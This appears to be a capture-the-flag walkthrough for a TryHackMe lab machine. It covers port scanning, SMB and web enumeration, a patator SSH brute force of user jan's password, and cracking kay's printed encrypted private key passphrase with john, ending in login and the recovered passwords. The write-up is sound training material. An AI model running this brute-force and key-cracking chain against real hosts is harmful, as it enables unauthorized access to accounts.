# [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

---

# Open Port Discovery

```bash
$ masscan -p1-65535 10.10.230.95 --rate=1000 -e tun0 --output-format grepable --output-filename basic-pentesting-tcp.masscan
$ cat basic-pentesting-tcp.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','

139,22,445,80,8009,8080,
```

```bash
$ masscan U:1-65536 10.10.230.95 --rate=1000 -e tun0 --output-format grepable --output-filename basic-pentesting-udp.masscan
$ cat basic-pentesting-udp.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','

```

- 0 UDP ports open

---

# Open Port Enumeration

```bash
$ nmap -sC -sV -O -p139,22,445,80,8009,8080 10.10.230.95 -oA basic-pentesting

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 08:01 CDT
Nmap scan report for 10.10.230.95
Host is up (0.11s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%), Linux 3.13 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-08-10T09:01:39-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-10T13:01:39
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.71 seconds
```

---

# SMB Enumeration

Attempt to list SMB shares on the target.

```bash
$ smbmap -H 10.10.230.95

[+] Guest session       IP: 10.10.230.95:445    Name: 10.10.230.95                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.3.11-Ubuntu)
```

- Interesting read-only share: `Anonymous`

Attempt to browse the `Anonymous` share.

```bash
$ smbclient -U anonymous //10.10.230.95/Anyonmous

Enter WORKGROUP\anonymous's password: 
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
```

No luck accessing the `Anonymous` share.

```bash
$ enum4linux -a 

...

[+] Enumerating users using SID S-1-22-1 and logon username '', password '' 
S-1-22-1-1000 Unix User\kay (Local User) 
S-1-22-1-1001 Unix User\jan (Local User)
...
```

Two usernames found: `kay` and `jan`.

---

# Web Application Enumeration

## Port 80

![](images/Pasted%20image%2020210810091217.png)

### Content Discovery

```bash
$ gobuster dir -u http://10.10.230.95 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt -x php

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.95
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/08/10 08:23:09 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 292]
/.html.php            (Status: 403) [Size: 296]
/.htm                 (Status: 403) [Size: 291]
/.htm.php             (Status: 403) [Size: 295]
/.                    (Status: 200) [Size: 158]
/.htaccess            (Status: 403) [Size: 296]
/.htaccess.php        (Status: 403) [Size: 300]
/development          (Status: 301) [Size: 318] [--> http://10.10.230.95/development/]
/.htc                 (Status: 403) [Size: 291]
/.htc.php             (Status: 403) [Size: 295]
/.html_var_DE         (Status: 403) [Size: 299]
/.html_var_DE.php     (Status: 403) [Size: 303]
/server-status        (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 296]
/.htpasswd.php        (Status: 403) [Size: 300]
/.html.               (Status: 403) [Size: 293]
/.html..php           (Status: 403) [Size: 297]
/.html.html           (Status: 403) [Size: 297]
/.html.html.php       (Status: 403) [Size: 301]
/.htpasswds           (Status: 403) [Size: 297]
/.htpasswds.php       (Status: 403) [Size: 301]
/.htm.                (Status: 403) [Size: 292]
/.htm..php            (Status: 403) [Size: 296]
/.htmll               (Status: 403) [Size: 293]
/.htmll.php           (Status: 403) [Size: 297]
/.html.old            (Status: 403) [Size: 296]
/.html.old.php        (Status: 403) [Size: 300]
/.ht                  (Status: 403) [Size: 290]
/.html.bak            (Status: 403) [Size: 296]
/.ht.php              (Status: 403) [Size: 294]
/.html.bak.php        (Status: 403) [Size: 300]
/.htm.htm.php         (Status: 403) [Size: 299]
/.htm.htm             (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 291]
/.htgroup.php         (Status: 403) [Size: 299]
/.html1               (Status: 403) [Size: 293]
/.hta.php             (Status: 403) [Size: 295]
/.htgroup             (Status: 403) [Size: 295]
/.html1.php           (Status: 403) [Size: 297]
/.html.LCK.php        (Status: 403) [Size: 300]
/.html.printable      (Status: 403) [Size: 302]
/.html.LCK            (Status: 403) [Size: 296]
/.html.printable.php  (Status: 403) [Size: 306]
/.htm.LCK             (Status: 403) [Size: 295]
/.htm.LCK.php         (Status: 403) [Size: 299]
/.htaccess.bak        (Status: 403) [Size: 300]
/.html.php            (Status: 403) [Size: 296]
/.htmls               (Status: 403) [Size: 293]
/.htx                 (Status: 403) [Size: 291]
/.htaccess.bak.php    (Status: 403) [Size: 304]
/.html.php.php        (Status: 403) [Size: 300]
/.htmls.php           (Status: 403) [Size: 297]
/.htx.php             (Status: 403) [Size: 295]
/.htlm.php            (Status: 403) [Size: 296]
/.htm2                (Status: 403) [Size: 292]
/.html-               (Status: 403) [Size: 293]
/.htuser              (Status: 403) [Size: 294]
/.htlm                (Status: 403) [Size: 292]
/.htm2.php            (Status: 403) [Size: 296]
/.html-.php           (Status: 403) [Size: 297]
/.htuser.php          (Status: 403) [Size: 298]

===============================================================
2021/08/10 08:38:19 Finished
===============================================================
```

- Interesting directory:
	- `/development/`

#### `/development/`

![](images/Pasted%20image%2020210810092023.png)

##### `/development/dev.txt`

```txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

##### `/development/j.txt`

```txt
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

User `J`'s (presumably `jan`) password is weak and probably inside `rockyou.txt`. Since it is in `/etc/shadow`, this password can be brute-forced via SSH.

## Port 8009

![](images/Pasted%20image%2020210810091339.png)

```bash
$ nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 10.10.230.95

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 08:54 CDT                                                                                                                      
Nmap scan report for 10.10.230.95
Host is up (0.11s latency).
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-headers:
|_  Content-Type: text/html;charset=UTF-8
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
| ajp-request:
| AJP/1.3 200 200
| Content-Type: text/html;charset=UTF-8
|
| e</a></li>
|                             <li><a href="http://tomcat.apache.org/taglibs/">Taglibs</a></li>
|                             <li><a href="/docs/deployer-howto.html">Deployer</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Other Documentation</h4>
|                         <ul>
|                             <li><a href="http://tomcat.apache.org/connectors-doc/">Tomcat Connectors</a></li>
|                             <li><a href="http://tomcat.apache.org/connectors-doc/">mod_jk Documentation</a></li>
|                             <li><a href="http://tomcat.apache.org/native-doc/">Tomcat Native</a></li>
|                             <li><a href="/docs/deployer-howto.html">Deployer</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container"> 
|                         <h4>Get Involved</h4>
|                         <ul>
|                             <li><a href="http://tomcat.apache.org/getinvolved.html">Overview</a></li>
|                             <li><a href="http://tomcat.apache.org/svn.html">SVN Repositories</a></li>
|                             <li><a href="http://tomcat.apache.org/lists.html">Mailing Lists</a></li>
|                             <li><a href="http://wiki.apache.org/tomcat/FrontPage">Wiki</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container"> 
|                         <h4>Miscellaneous</h4>
|                         <ul>
|                             <li><a href="http://tomcat.apache.org/contact.html">Contact</a></li>
<li><a href="http://tomcat.apache.org/legal.html">Legal</a></li>
|                             <li><a href="http://www.apache.org/foundation/sponsorship.html">Sponsorship</a></li>
|                             <li><a href="http://www.apache.org/foundation/thanks.html">Thanks</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container"> 
|                         <h4>Apache Software Foundation</h4>
|                         <ul>
|                             <li><a href="http://tomcat.apache.org/whoweare.html">Who We Are</a></li>
|                             <li><a href="http://tomcat.apache.org/heritage.html">Heritage</a></li>
|                             <li><a href="http://www.apache.org">Apache Home</a></li>
|                             <li><a href="http://tomcat.apache.org/resources.html">Resources</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <br class="separator" />
|             </div>
|             <p class="copyright">Copyright &copy;1999-2021 Apache Software Foundation.  All Rights Reserved</p>
|         </div>
|     </body>
| 
|_</html>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```

## Port 8080

![](images/Pasted%20image%2020210810091421.png)

Apache Tomcat 9.0.7 default landing page.

### Tomcat-Specific Content Discovery

```bash
$ gobuster dir -u http://10.10.230.95:8080 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/tomcat.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.95:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Seclists/Discovery/Web-Content/tomcat.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/10 08:16:28 Starting gobuster in directory enumeration mode
===============================================================
/examples             (Status: 302) [Size: 0] [--> /examples/]
/examples/jsp/index.html (Status: 200) [Size: 14244]          
/examples/servlets/index.html (Status: 200) [Size: 6596]      
/examples/../manager/html (Status: 401) [Size: 2473]          
/examples/%2e%2e/manager/html (Status: 401) [Size: 2473]      
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/host-manager/html/*  (Status: 401) [Size: 2044]                  
/examples/jsp/snp/snoop.jsp (Status: 200) [Size: 578]             
/examples/jsp/source.jsp (Status: 500) [Size: 2593]               
/manager              (Status: 302) [Size: 0] [--> /manager/]     
/manager/html/*       (Status: 401) [Size: 2473]                  
/manager/html         (Status: 401) [Size: 2473]                  
/manager/jmxproxy/*   (Status: 401) [Size: 2473]                  
/manager/jmxproxy     (Status: 401) [Size: 2473]                  
/manager/status.xsd   (Status: 200) [Size: 4374]                  
/manager/status/*     (Status: 401) [Size: 2473]                  
                                                                  
===============================================================
2021/08/10 08:16:30 Finished
===============================================================
```

### General Content Discovery

```bash
$ gobuster dir -u http://10.10.230.95:8080 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.95:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/10 09:39:24 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/.                    (Status: 200) [Size: 11228]            
/examples             (Status: 302) [Size: 0] [--> /examples/]
                                                              
===============================================================
2021/08/10 09:46:55 Finished
===============================================================
```

---

# SSH Brute-Force Jan's Password

```bash
$ patator ssh_login host=10.10.230.95 user=jan password=FILE0 0=rockyou.txt -x ignore:mesg='Authentication failed.'

09:32:17 patator INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-10 09:32 CDT
09:32:18 patator INFO - 
09:32:18 patator INFO - code size time | candidate | num | mesg
09:32:18 patator INFO - -----------------------------------------------------------------------------
09:34:05 patator INFO - Progress: 0% (450/14344392) | Speed: 4 r/s | ETC: 17:28:34 (943:54:28 remaining) 
09:35:25 patator INFO - 0 39 0.212 | armando | 780 | SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

`jan`'s password is `armando`.

---

# SSH Private Key Passphrase Attack Against Kay

`kay`'s SSH private key is world-readable.

```bash
$ ls -la /home/kay/.ssh

total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

Save the private key offline.

```bash
$ cat /home/kay/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----
```

Note that the private key is encrypted with a passphrase. Attempt to crack the SSH private key's passphrase.

```bash
$ python2 /usr/share/john/ssh2john.py kay_rsa > kay_rsa.john
$ john --wordlist=rockyou.txt kay_rsa.john

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:03 DONE (2021-08-17 18:52) 0.2525g/s 3621Kp/s 3621Kc/s 3621KC/sa6_123..*7Â¡Vamos!
Session completed
```

The SSH private key's passphrase is `beeswax`. Login as `kay`.

```bash
$ ssh kay@10.10.14.255 -i kay_rsa


Enter passphrase for key 'kay_rsa': beeswax
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ id
uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
 
 Read `kay`'s backup password file `/home/kay/pass.bak` to answer the final question.
 
 ```bash
 $ cat /home/kay/pass.bak
 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
 ```
 